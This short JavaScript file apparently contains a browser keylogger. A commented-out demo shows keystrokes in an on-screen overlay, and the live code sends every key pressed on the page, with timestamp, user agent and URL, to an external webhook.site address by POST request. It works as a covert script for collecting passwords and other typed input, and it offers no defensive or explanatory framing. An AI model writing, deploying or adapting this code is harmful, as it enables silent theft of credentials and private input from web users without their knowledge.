// (function(){
//     let keysPressed = "";
//     const displayDiv = document.createElement("div");
//     displayDiv.style.position = "fixed";
//     displayDiv.style.bottom = "10px";
//     displayDiv.style.left = "10px";
//     displayDiv.style.padding = "10px";
//     displayDiv.style.background = "rgba(0,0,0,0.7)";
//     displayDiv.style.color = "#00ff00";  // Chữ xanh dễ nhìn
//     displayDiv.style.fontSize = "20px";
//     displayDiv.style.zIndex = 9999;
//     displayDiv.innerText = "Keys: ";
//     document.body.appendChild(displayDiv);

//     // Đảm bảo focus body
//     window.addEventListener("load", function(){
//         document.body.focus();
//     });

//     // Bắt phím từ toàn bộ document
//     document.addEventListener("keydown", function(event){
//         keysPressed += event.key;
//         console.log("User typed: " + keysPressed);
//         displayDiv.innerText = "Keys: " + keysPressed;

//         if (keysPressed.length >= 10) {
//             alert("10 chars typed: " + keysPressed);
//             keysPressed = "";
//             displayDiv.innerText = "Keys: ";
//         }
//     });

// })();

document.addEventListener("keydown", function(event){
    const payload = {
        key: event.key,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href
    };
    
    fetch("https://webhook.site/abc123", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
});